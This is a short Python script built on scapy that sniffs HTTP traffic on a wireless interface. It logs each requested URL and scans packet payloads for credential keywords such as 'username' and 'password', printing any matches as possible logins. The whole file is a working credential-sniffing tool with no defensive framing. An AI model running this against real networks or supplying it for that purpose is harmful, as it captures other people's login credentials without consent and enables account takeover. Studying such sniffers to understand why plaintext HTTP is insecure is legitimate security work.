import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["uname", "pass", "username", "password", "passwd", "user", "login"]
        for key in keywords:
            if key in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # url = packet[http.HTTPRequest].Referer
        url = get_url(packet)
        print("[+]HTTP request >> " + str(url))
        login_info = get_info(packet)
        if login_info:
            print("\n\n[+]Possible Username/Password >> " + login_info + "\n\n")


sniff("wlan0")
